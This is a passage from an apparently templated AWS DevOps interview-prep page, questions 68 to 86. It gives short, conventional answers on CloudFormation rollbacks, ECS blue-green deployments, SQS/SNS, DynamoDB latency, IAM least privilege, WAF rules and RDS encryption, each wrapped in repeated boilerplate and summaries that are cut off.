- Immediate Triage: Objects must be > 128KB for lifecycle transition to Glacier to apply. Also check the prefix fil
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-68-aws-q52-cloudformation-stack-update-is-failing-and-rolling-back-l2"></a>
### 68. AWS Q52: CloudFormation stack update is failing and rolling back [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"CloudFormation stack update is failing and rolling back."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Check CloudFormation events in console for the failure reason. Common: IAM permissions, resource limit, invalid property value. Fix the template, then redeploy.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Check CloudFormation events in console for the failure reason. Common: IAM permissions, resource limit, invalid property value. Fi.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Check CloudFormation events in console for the failure reason. Common: IAM permissions, resourc
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-69-aws-q53-how-do-you-implement-blue-green-deployments-on-ecs-l3"></a>
### 69. AWS Q53: How do you implement blue-green deployments on ECS [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Cost & Architecture` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"How do you implement blue-green deployments on ECS?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Use CodeDeploy with ECS blue/green. Two target groups (blue=current, green=new). CodeDeploy shifts traffic gradually from blue to green. Auto-rollback if CloudWatch alarms trigger.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Use CodeDeploy with ECS blue/green. Two target groups (blue=current, green=new). CodeDeploy shifts traffic gradually from blue to .

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Use CodeDeploy with ECS blue/green. Two target groups (blue=current, green=new). CodeDeploy shi
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-70-aws-q54-sqs-queue-is-growing-consumer-cant-keep-up-l2"></a>
### 70. AWS Q54: SQS queue is growing (consumer cant keep up) [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"SQS queue is growing (consumer can't keep up)."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Scale out consumer EC2/ECS instances. Use ASG scaled on `ApproximateNumberOfMessagesVisible` CloudWatch metric. Or move to Lambda consumer (auto-scales with queue depth).

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Scale out consumer EC2/ECS instances. Use ASG scaled on ApproximateNumberOfMessagesVisible CloudWatch metric. Or move to Lambda co.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Scale out consumer EC2/ECS instances. Use ASG scaled on ApproximateNumberOfMessagesVisible Clou
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-71-aws-q55-sns-topic-notification-not-being-received-l2"></a>
### 71. AWS Q55: SNS topic notification not being received [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"SNS topic notification not being received."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Check subscription is confirmed (for email, need to click confirmation link). Check subscription filter policy. Check dead-letter queue for failed deliveries.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Check subscription is confirmed (for email, need to click confirmation link). Check subscription filter policy. Check dead-letter .

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Check subscription is confirmed (for email, need to click confirmation link). Check subscriptio
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-72-aws-q56-what-is-the-difference-between-sqs-and-sns-l1"></a>
### 72. AWS Q56: What is the difference between SQS and SNS [L1]

**Level:** `Junior / Associate DevOps [L1]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Core Fundamentals [L1]`

**Tags:** `AWS` `Cost & Architecture` `L1` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"What is the difference between SQS and SNS?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

SNS = pub/sub, one message to many subscribers (fan-out). SQS = queue, message stored until a consumer reads and deletes it (point-to-point). Combine: SNS fan-out to multiple SQS queues.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: SNS = pub/sub, one message to many subscribers (fan-out). SQS = queue, message stored until a consumer reads and deletes it (point.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: SNS = pub/sub, one message to many subscribers (fan-out). SQS = queue, message stored until a c
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-73-aws-q57-dynamodb-read-latency-suddenly-increased-l2"></a>
### 73. AWS Q57: DynamoDB read latency suddenly increased [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"DynamoDB read latency suddenly increased."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Check for hot partitions (one partition key getting all traffic). Use DynamoDB Accelerator (DAX) for microsecond read caching. Check consumed Read Capacity Units vs provisioned.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Check for hot partitions (one partition key getting all traffic). Use DynamoDB Accelerator (DAX) for microsecond read caching. Che.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Check for hot partitions (one partition key getting all traffic). Use DynamoDB Accelerator (DAX
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-74-aws-q58-how-do-you-implement-least-privilege-access-for-a-microservices-application-where-each-service-has-a-different-iam-role-l3"></a>
### 74. AWS Q58: How do you implement least-privilege access for a microservices application where each service has a different IAM role [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Cost & Architecture` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"How do you implement least-privilege access for a microservices application where each service has a different IAM role?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Each ECS task or Lambda function has its own IAM role with only the permissions it needs. Use task IAM roles for ECS, execution roles for Lambda. Never share roles between services.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Each ECS task or Lambda function has its own IAM role with only the permissions it needs. Use task IAM roles for ECS, execution ro.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Each ECS task or Lambda function has its own IAM role with only the permissions it needs. Use t
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-75-aws-q59-cloudfront-is-serving-stale-content-after-you-updated-s3-l2"></a>
### 75. AWS Q59: CloudFront is serving stale content after you updated S3 [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"CloudFront is serving stale content after you updated S3."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Invalidate the CloudFront cache: `aws cloudfront create-invalidation --distribution-id  --paths "/*"`. Or use cache-control headers and versioned file names to prevent caching issues.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Invalidate the CloudFront cache: aws cloudfront create-invalidation --distribution-id  --paths "/*". Or use cache-control headers .

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Invalidate the CloudFront cache: aws cloudfront create-invalidation --distribution-id  --paths
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-76-aws-q60-design-an-event-driven-architecture-for-image-processing-upload-resize-store-l3"></a>
### 76. AWS Q60: Design an event-driven architecture for image processing (upload → resize → store) [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Cost & Architecture` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Design an event-driven architecture for image processing (upload → resize → store)."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

S3 upload → S3 Event Notification → SQS queue → Lambda consumer reads from SQS → resizes image → stores to output S3 bucket → SNS notification to user.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: S3 upload → S3 Event Notification → SQS queue → Lambda consumer reads from SQS → resizes image → stores to output S3 bucket → SNS .

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: S3 upload → S3 Event Notification → SQS queue → Lambda consumer reads from SQS → resizes image
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-77-aws-q61-route-53-health-check-is-failing-for-your-endpoint-but-the-endpoint-seems-fine-l2"></a>
### 77. AWS Q61: Route 53 health check is failing for your endpoint but the endpoint seems fine [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Route 53 health check is failing for your endpoint but the endpoint seems fine."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Route 53 health checks come from specific IP ranges. Ensure Security Group/firewall allows those IPs. Check the health check protocol (HTTP vs HTTPS) and the expected response code.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Route 53 health checks come from specific IP ranges. Ensure Security Group/firewall allows those IPs. Check the health check proto.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Route 53 health checks come from specific IP ranges. Ensure Security Group/firewall allows thos
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-78-aws-q62-you-need-to-run-a-containerized-batch-job-once-per-day-on-aws-whats-the-simplest-approach-l2"></a>
### 78. AWS Q62: You need to run a containerized batch job once per day on AWS Whats the simplest approach [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"You need to run a containerized batch job once per day on AWS. What's the simplest approach?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

ECS Scheduled Tasks — set a cron expression on the ECS task. ECS runs the Fargate task on schedule and stops it when done.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: ECS Scheduled Tasks — set a cron expression on the ECS task. ECS runs the Fargate task on schedule and stops it when done..

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: ECS Scheduled Tasks — set a cron expression on the ECS task. ECS runs the Fargate task on sched
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-79-aws-q63-how-does-aws-waf-protect-your-alb-and-what-rules-would-you-set-up-for-a-web-app-l3"></a>
### 79. AWS Q63: How does AWS WAF protect your ALB and what rules would you set up for a web app [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Cost & Architecture` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"How does AWS WAF protect your ALB and what rules would you set up for a web app?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

WAF inspects HTTP requests before they reach the ALB. Rules: AWS Managed Rule Groups (OWASP top 10, bot control), IP rate limiting (prevent DDoS), geo-blocking, SQL injection detection, XSS detection. Set rules to block or count.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: WAF inspects HTTP requests before they reach the ALB. Rules: AWS Managed Rule Groups (OWASP top 10, bot control), IP rate limiting.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: WAF inspects HTTP requests before they reach the ALB. Rules: AWS Managed Rule Groups (OWASP top
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-80-aws-q64-your-lambda-function-is-doing-the-same-cold-start-every-invocation-because-it-initializes-a-big-ml-model-how-do-you-fix-it-l2"></a>
### 80. AWS Q64: Your Lambda function is doing the same cold start every invocation because it initializes a big ML model How do you fix it [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Your Lambda function is doing the same cold start every invocation because it initializes a big ML model. How do you fix it?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Move model loading code to the Lambda initialization phase (outside the handler function). The runtime container is reused between invocations. Use Provisioned Concurrency to pre-warm instances if cold starts are unacceptable.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Move model loading code to the Lambda initialization phase (outside the handler function). The runtime container is reused between.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Move model loading code to the Lambda initialization phase (outside the handler function). The
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-81-aws-q65-you-need-to-store-application-state-for-a-session-based-web-app-deployed-across-multiple-ec2-instances-where-do-you-store-sessions-l2"></a>
### 81. AWS Q65: You need to store application state for a session-based web app deployed across multiple EC2 instances Where do you store sessions [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"You need to store application state for a session-based web app deployed across multiple EC2 instances. Where do you store sessions?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

ElastiCache Redis — shared in-memory store that all instances can access. Never store sessions in local EC2 memory (breaks when an instance is replaced) or in cookies (security risk for sensitive data).

#### 🎯 Key Architectural Takeaway
> Pro-Tip: ElastiCache Redis — shared in-memory store that all instances can access. Never store sessions in local EC2 memory (breaks when an.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: ElastiCache Redis — shared in-memory store that all instances can access. Never store sessions
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-82-aws-q66-what-is-aws-systems-manager-parameter-store-vs-secrets-manager-l2"></a>
### 82. AWS Q66: What is AWS Systems Manager Parameter Store vs Secrets Manager [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"What is AWS Systems Manager Parameter Store vs Secrets Manager?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Parameter Store = config and non-sensitive parameters. Free tier available. Secrets Manager = specifically for secrets. Auto-rotation built in. Charges per secret. For passwords: use Secrets Manager with auto-rotation. For config: use Parameter Store.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Parameter Store = config and non-sensitive parameters. Free tier available. Secrets Manager = specifically for secrets. Auto-rotat.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Parameter Store = config and non-sensitive parameters. Free tier available. Secrets Manager = s
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-83-aws-q67-your-production-db-needs-a-schema-migration-that-could-lock-tables-for-minutes-how-do-you-do-this-with-zero-downtime-l3"></a>
### 83. AWS Q67: Your production DB needs a schema migration that could lock tables for minutes How do you do this with zero downtime [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Cost & Architecture` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Your production DB needs a schema migration that could lock tables for minutes. How do you do this with zero downtime?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Use a no-lock migration approach: add new column (no lock), backfill data in batches, add new index concurrently, switch app to use new column, drop old column later. For major migrations, use tools like gh-ost (MySQL) or pg_repack (Postgres).

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Use a no-lock migration approach: add new column (no lock), backfill data in batches, add new index concurrently, switch app to us.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Use a no-lock migration approach: add new column (no lock), backfill data in batches, add new i
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-84-aws-q68-ec2-instances-in-an-asg-arent-launching-due-to-insufficientinstancecapacity-l2"></a>
### 84. AWS Q68: EC2 instances in an ASG arent launching due to InsufficientInstanceCapacity [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"EC2 instances in an ASG aren't launching due to `InsufficientInstanceCapacity`."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Spot capacity issue or that AZ/region is out of that instance type. Mitigate: use multiple instance types in the ASG (mixed instances policy), use multiple AZs, configure capacity rebalancing.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Spot capacity issue or that AZ/region is out of that instance type. Mitigate: use multiple instance types in the ASG (mixed instan.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Spot capacity issue or that AZ/region is out of that instance type. Mitigate: use multiple inst
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-85-aws-q69-how-do-you-enable-encryption-for-an-existing-unencrypted-rds-instance-l2"></a>
### 85. AWS Q69: How do you enable encryption for an existing unencrypted RDS instance [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"How do you enable encryption for an existing unencrypted RDS instance?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

RDS doesn't allow enabling encryption on a running instance. Steps: take a snapshot → copy the snapshot with encryption enabled → restore from encrypted snapshot → update app connection string → delete old instance.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: RDS doesn't allow enabling encryption on a running instance. Steps: take a snapshot → copy the snapshot with encryption enabled → .

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: RDS doesn't allow enabling encryption on a running instance. Steps: take a snapshot → copy the
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-86-aws-q70-an-application-deployed-via-elastic-beanstalk-needs-environment-variables-how-do-you-set-them-l2"></a>
### 86. AWS Q70: An application deployed via Elastic Beanstalk needs environment variables How do you set them [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"An application deployed via Elastic Beanstalk needs environment variables. How do you set them?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Elastic Beanstalk console → Environment → Configuration → Software → Environment properties. Or via `.ebextensions` files in your code. Or `aws elasticbeanstalk update-environment --option-settings`.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Elastic Beanstalk console → Environment → Configuration → Software → Environment properties. Or via .ebextensions files in your co.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Elastic Beanstalk console → Environment → Configuration → Software → Environment properties. Or
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

